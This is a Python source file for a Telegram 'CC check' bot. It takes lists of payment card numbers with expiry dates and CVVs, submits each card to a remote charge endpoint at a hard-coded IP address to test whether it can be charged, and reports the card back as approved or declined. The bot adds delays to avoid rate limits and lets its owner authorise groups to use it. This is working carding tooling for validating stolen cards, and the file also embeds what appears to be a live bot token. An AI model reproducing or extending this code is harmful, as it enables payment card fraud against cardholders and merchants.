import logging
import requests
import telebot
from threading import Event
import time
import json

# Telegram bot token
TOKEN = "7386696229:AAGR5SkB6NBqSogG_hUNj_uf0DkwCGKGZYc"
OWNER_ID = 7427691214  # Owner's Telegram ID

# Initialize the bot
bot = telebot.TeleBot(TOKEN)

# Define the API endpoint and static parameters
url = "http://85.239.240.97:8080/charge"

# Event to control the stopping of the card check process
stop_event = Event()

# List to store authorized group IDs
authorized_groups = []

# Load authorized groups from file (if exists)
try:
    with open('authorized_groups.json', 'r') as file:
        authorized_groups = json.load(file)
except FileNotFoundError:
    authorized_groups = []

def save_authorized_groups():
    with open('authorized_groups.json', 'w') as file:
        json.dump(authorized_groups, file)

# Start command handler
@bot.message_handler(commands=['start'])
def send_welcome(message):
    bot.reply_to(message, "Welcome! Use the /chk command followed by card details in the format `cc|mm|yyyy|cvv`, or send a TXT file with card details. Use /stop to stop the card check process.")

# /add command handler to authorize a group
@bot.message_handler(commands=['add'])
def add_group(message):
    if message.from_user.id != OWNER_ID:
        bot.reply_to(message, "You are not authorized to use this command.")
        return

    if message.chat.type != 'group' and message.chat.type != 'supergroup':
        bot.reply_to(message, "This command can only be used in groups.")
        return

    if message.chat.id not in authorized_groups:
        authorized_groups.append(message.chat.id)
        save_authorized_groups()
        bot.reply_to(message, f"Group {message.chat.title} has been authorized for CC checks.")
    else:
        bot.reply_to(message, f"Group {message.chat.title} is already authorized.")

# /chk command handler
@bot.message_handler(commands=['chk'])
def check_card(message):
    if message.chat.id != OWNER_ID and message.chat.id not in authorized_groups:
        bot.reply_to(message, "You are not authorized to use this command.")
        return

    card_details = message.text.split()[1:]
    if not card_details:
        bot.reply_to(message, "Please provide card details in the format `cc|mm|yyyy|cvv`.")
        return

    stop_event.clear()  # Clear the stop event before starting the process

    for card in card_details:
        if stop_event.is_set():
            bot.reply_to(message, "Card check process stopped.")
            break

        params = {
            'lista': card,
            'mode': 'cvv',
            'amount': 1,
            'currency': 'eur'
        }
        response = requests.get(url, params=params)
        
        try:
            response_data = response.json()
        except requests.exceptions.JSONDecodeError:
            bot.reply_to(message, f"Failed to decode JSON response. Response content: {response.text}")
            continue

        status = response_data.get("status", "--")
        response_text = response_data.get("response", "No response")
        time_taken = response_data.get("time_taken", "--")

        if status == "approved":
            formatted_response = (
                f"┏━━━━━━━⍟\n"
                f"┃#CHARGE 5$ ✅\n"
                f"┗━━━━━━━━━━━⊛\n"
                f"CARD:- {card}\n"
                f"RESPONSE:- {response_text} ✅\n"
                f"TIME:- {time_taken} seconds"
            )
        else:
            formatted_response = (
                f"┏━━━━━━━⍟\n"
                f"┃#DECLINE 5$ ❌\n"
                f"┗━━━━━━━━━━━⊛\n"
                f"CARD:- {card}\n"
                f"RESPONSE:- {response_text} ❌\n"
                f"TIME:- {time_taken} seconds"
            )

        bot.reply_to(message, formatted_response)
        time.sleep(10)  # Add delay to avoid rate limits

# Document handler
@bot.message_handler(content_types=['document'])
def handle_file(message):
    if message.document.mime_type == 'text/plain':
        if message.chat.id != OWNER_ID and message.chat.id not in authorized_groups:
            bot.reply_to(message, "You are not authorized to use this command.")
            return

        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        
        with open('lista.txt', 'wb') as f:
            f.write(downloaded_file)
        
        with open('lista.txt', 'r') as f:
            lista_values = f.readlines()
        
        stop_event.clear()  # Clear the stop event before starting the process

        for lista in lista_values:
            if stop_event.is_set():
                bot.reply_to(message, "Card check process stopped.")
                break

            lista = lista.strip()
            if lista:
                params = {
                    'lista': lista,
                    'mode': 'cvv',
                    'amount': 1,
                    'currency': 'eur'
                }
                response = requests.get(url, params=params)
                
                try:
                    response_data = response.json()
                except requests.exceptions.JSONDecodeError:
                    bot.reply_to(message, f"Failed to decode JSON response. Response content: {response.text}")
                    continue

                status = response_data.get("status", "--")
                response_text = response_data.get("response", "No response")
                time_taken = response_data.get("time_taken", "--")

                if status == "approved":
                    formatted_response = (
                        f"┏━━━━━━━⍟\n"
                        f"┃#CHARGE 5$ ✅\n"
                        f"┗━━━━━━━━━━━⊛\n"
                        f"CARD:- {lista}\n"
                        f"RESPONSE:- {response_text} ✅\n"
                        f"TIME:- {time_taken} seconds"
                    )
                else:
                    formatted_response = (
                        f"┏━━━━━━━⍟\n"
                        f"┃#DECLINE 5$ ❌\n"
                        f"┗━━━━━━━━━━━⊛\n"
                        f"CARD:- {lista}\n"
                        f"RESPONSE:- {response_text} ❌\n"
                        f"TIME:- {time_taken} seconds"
                    )

                bot.reply_to(message, formatted_response)
                time.sleep(10)  # Add delay to avoid rate limits

# /stop command handler
@bot.message_handler(commands=['stop'])
def stop_process(message):
    if message.from_user.id == OWNER_ID:
        stop_event.set()
        bot.reply_to(message, "Card check process has been stopped.")
    else:
        bot.reply_to(message, "You are not authorized to use this command.")

if __name__ == '__main__':
    logging.basicConfig(level=logging.INFO)
    bot.polling()
